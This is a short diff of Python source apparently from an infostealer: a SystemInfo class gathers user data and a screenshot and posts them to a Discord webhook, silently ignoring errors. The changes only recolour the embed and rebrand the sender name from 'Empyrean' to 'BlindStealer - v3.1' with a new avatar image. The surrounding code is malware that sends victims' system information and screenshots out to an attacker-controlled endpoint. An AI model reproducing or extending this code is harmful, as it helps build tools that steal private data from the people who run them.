@@ -15,7 +15,7 @@ import time
 class SystemInfo():
     def __init__(self, webhook: str) -> None:
         webhook = SyncWebhook.from_url(webhook)
-        embed = Embed(title="System Information", color=0x000000)
+        embed = Embed(title="System Information", color=0x24262A)
 
         embed.add_field(
             name=self.user_data()[0],
@@ -56,8 +56,8 @@ class SystemInfo():
             webhook.send(
                 embed=embed,
                 file=File('.\\screenshot.png', filename='screenshot.png'),
-                username="Empyrean",
-                avatar_url="https://i.imgur.com/HjzfjfR.png"
+                username="BlindStealer - v3.1",
+                avatar_url="https://i.imgur.com/LNVOaxg.png"
             )
         except:
             pass
